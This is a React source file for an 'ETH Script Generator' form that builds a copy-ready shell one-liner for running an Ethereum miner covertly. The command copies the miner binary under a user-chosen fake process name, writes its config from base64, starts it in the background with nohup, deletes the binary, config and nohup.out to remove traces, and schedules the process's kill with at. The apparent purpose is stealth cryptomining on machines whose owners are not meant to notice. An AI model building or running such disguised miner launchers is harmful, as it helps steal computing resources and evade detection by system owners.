import React, {useState} from 'react';
import './App.css';
import '98.css';

const App = () => {
    const [minerFilepath, setMinerFilepath] = useState('')
    const [fakeProcessName, setFakeProcessName] = useState('')
    const [config, setConfig] = useState('')
    const [configFilename, setConfigFilename] = useState('')
    const [killAt, setKillAt] = useState('')
    const [message, setMessage] = useState('')

    const clipboard = navigator.clipboard

    const script = ` echo ${new Buffer(config).toString('base64')} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 5 && rm -rf nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill -9 | at ${killAt}`

    const handleCopyScriptBtnClick = () => {
        clipboard.writeText(script).then(() => {
            setMessage('Copy script successful')
        }).catch((e) => {
            console.error(e)
            setMessage('Failed to copy script')
        }).finally(() => {
            setTimeout(() => {
                setMessage('')
            }, 3000)
        })
    }

    const handleResetBtnClick = () => {
        setMinerFilepath('')
        setFakeProcessName('')
        setConfig('')
        setConfigFilename('')
        setKillAt('')
        setMessage('')
    }

    return (
        <div
            className="window"
            style={{width: '600px'}}
        >
            <div className="title-bar">
                <div className="title-bar-text">
                    ETH Script Generator
                </div>
            </div>
            <div className="window-body">
                <div className="field-row-stacked">
                    <label>Miner filepath</label>
                    <input
                        type="text"
                        value={minerFilepath}
                        onChange={e => setMinerFilepath(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Fake process name</label>
                    <input
                        type="text"
                        value={fakeProcessName}
                        onChange={e => setFakeProcessName(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Config</label>
                    <textarea
                        rows={10}
                        value={config}
                        onChange={e => setConfig(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Config filename</label>
                    <input
                        type="text"
                        value={configFilename}
                        onChange={e => setConfigFilename(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Kill at</label>
                    <input
                        type="text"
                        value={killAt}
                        onChange={e => setKillAt(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Script</label>
                    <textarea
                        rows={8}
                        disabled
                        value={script}
                    />
                </div>
                <div className="field-row">
                    <button onClick={handleCopyScriptBtnClick}>Copy script</button>
                    <button onClick={handleResetBtnClick}>Reset</button>
                </div>
                <div>
                    <p>{message}</p>
                </div>
            </div>
        </div>
    );
}

export default App;
